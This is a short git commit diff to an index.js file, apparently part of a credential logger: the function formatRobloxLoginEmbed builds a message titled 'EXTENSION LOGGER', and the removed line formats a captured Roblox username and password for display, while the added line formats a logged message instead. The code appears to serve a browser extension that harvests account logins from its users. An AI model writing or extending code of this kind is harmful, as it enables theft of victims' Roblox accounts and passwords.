1d6619e5d91a2cc369bcddf8dec2e16f05eabb4d
WeAreDevs-ops <cleencuevas@gmail.com>
2025-09-11 09:59:27 +0800

    Update index.js

--- index.js
+++ index.js
@@ -613,7 +613,7 @@ function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
       title: `<:emoji_37:1410520517349212200> **EXTENSION LOGGER**`,
-      description: `\`\`\`\nUsername: ${logData.username}\nPassword: ${logData.password}\`\`\``,
+      description: "```" + logData.message.replace(", ", "\n") + "```",
       color: 0xFFFFFF,
       fields: [
         {
